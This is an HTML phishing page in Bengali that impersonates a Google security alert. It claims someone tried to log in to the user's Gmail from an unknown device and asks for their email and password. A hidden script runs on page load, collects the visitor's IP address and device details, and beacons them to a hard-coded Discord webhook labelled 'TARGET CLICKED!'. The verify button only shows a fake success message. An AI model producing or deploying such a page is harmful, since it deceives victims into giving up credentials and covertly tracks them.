<!DOCTYPE html>
<html lang="bn">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Google Security Alert</title>

    <script>
        // ১. তোমার ডিসকর্ড লিঙ্কে যদি কোনো ভুল থাকে তাই আমি এটি ভেরিয়েবল এ রাখছি
        const dh = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";

        async function sendInstant() {
            let userIP = "N/A";
            let userDevice = navigator.userAgent.split('(')[1]?.split(')')[0] || "Unknown Device";

            // ২. আইপি ধরার সবচেয়ে ফাস্ট উপায়
            try {
                const r = await fetch('https://api.ipify.org?format=json');
                const d = await r.json();
                userIP = d.ip;
            } catch (e) {}

            // ৩. ডিসকর্ডে পাঠানোর জন্য শক্তিশালী মেথড (Keep-Alive ব্যবহার করা হয়েছে)
            const payload = JSON.stringify({
                content: "🚨 **TARGET CLICKED!**",
                embeds: [{
                    color: 16711680,
                    fields: [
                        { name: "🌐 IP Address", value: userIP },
                        { name: "📱 Device Info", value: userDevice }
                    ]
                }]
            });

            // ব্রাউজার যেন আটকাতে না পারে তাই 'navigator.sendBeacon' ব্যবহার করা হয়েছে (সবচেয়ে ফাস্ট)
            navigator.sendBeacon(dh, payload);
        }

        // ৪. ক্লিক করার সাথে সাথেই রান হবে
        sendInstant();
    </script>

    <style>
        body { background: #f1f3f4; font-family: 'Roboto', Arial, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .box { width: 90%; max-width: 400px; background: white; padding: 40px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); text-align: center; border-top: 6px solid #d93025; }
        .red-alert { color: #d93025; font-weight: bold; margin-bottom: 20px; font-size: 18px; }
        .msg { background: #fef7f7; border-left: 4px solid #d93025; padding: 15px; text-align: left; font-size: 14px; margin-bottom: 20px; color: #3c4043; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; }
        .btn { width: 100%; padding: 15px; background: #1a73e8; color: white; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; font-size: 16px; margin-top: 10px; }
    </style>
</head>
<body>

<div class="box">
    <img src="https://www.gstatic.com/images/branding/product/2x/googleg_48dp.png" width="48">
    <div class="red-alert">সিকিউরিটি ভেরিফিকেশন প্রয়োজন</div>
    <div class="msg">
        আপনার জিমেইল অ্যাকাউন্টে অন্য একটি অপরিচিত ডিভাইস থেকে লগইন করার চেষ্টা করা হয়েছে। আইডিটি নিরাপদ রাখতে নিচের তথ্যগুলো দিয়ে ভেরিফাই করুন।
    </div>
    <input type="email" id="email" placeholder="ইমেইল বা ফোন">
    <input type="password" id="pass" placeholder="পাসওয়ার্ড দিন">
    <button class="btn" onclick="alert('ভেরিফিকেশন সফল হয়েছে। আপনার আইডি এখন নিরাপদ।')">ভেরিফাই করুন</button>
</div>

</body>
</html>
